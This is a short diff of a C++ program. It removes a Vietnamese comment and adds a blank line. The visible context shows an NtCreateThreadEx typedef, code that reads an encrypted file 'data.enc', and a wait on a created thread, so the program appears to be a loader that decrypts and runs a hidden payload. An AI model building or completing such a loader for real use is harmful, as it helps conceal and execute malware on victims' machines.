@@ -40,7 +40,7 @@ typedef NTSTATUS(NTAPI* fNtCreateThreadEx)(
 int main() {
     const char* path = "data.enc";
 
-    // Đọc file mã hóa
+    
     std::ifstream file(path, std::ios::binary);
     if (!file) {
         std::cerr << "[-] Can't read the file: " << path << std::endl;
@@ -102,4 +102,5 @@ int main() {
     WaitForSingleObject(hThread, INFINITE);
     return 0;
 }
+
 
